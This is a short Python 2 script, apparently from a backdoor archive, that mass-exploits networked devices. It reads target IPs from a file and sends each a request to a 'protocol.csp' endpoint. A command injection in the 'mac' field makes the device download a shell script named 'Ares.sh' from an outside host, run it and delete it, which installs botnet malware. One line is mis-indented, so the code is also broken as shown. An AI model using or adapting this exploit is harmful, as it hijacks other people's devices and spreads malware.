#!/usr/bin/python

#DOWNLOADED BY B4CKDOORARCHIVE.HOST | 4 PRIVATE STUFF PME ME.

import threading
import sys
import time
import random
import socket
import subprocess
import re
import os
import struct
import array
import requests
from threading import Thread
from time import sleep
from requests.auth import HTTPDigestAuth
from decimal import *	

ips = open(sys.argv[1], "r").readlines()

def run(cmd):
    subprocess.call(cmd, shell=True)	
class tripmate(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				print "AReScRackd--> " + self.ip

url = "http://" + self.ip + "/protocol.csp?function=set&fname=security&opt=mac_table&flag=close_forever&mac=|wget http://b4.ck.do.or/Ares.sh; chmod 777 Ares.sh; sh Ares.sh; rm -rf Ares.sh"

				requests.get(url, timeout=3)

			except Exception as e:
				pass
for ip in ips:
	try:
		r = tripmate(ip)
		r.start()
		time.sleep(0.03)
	except:
		pass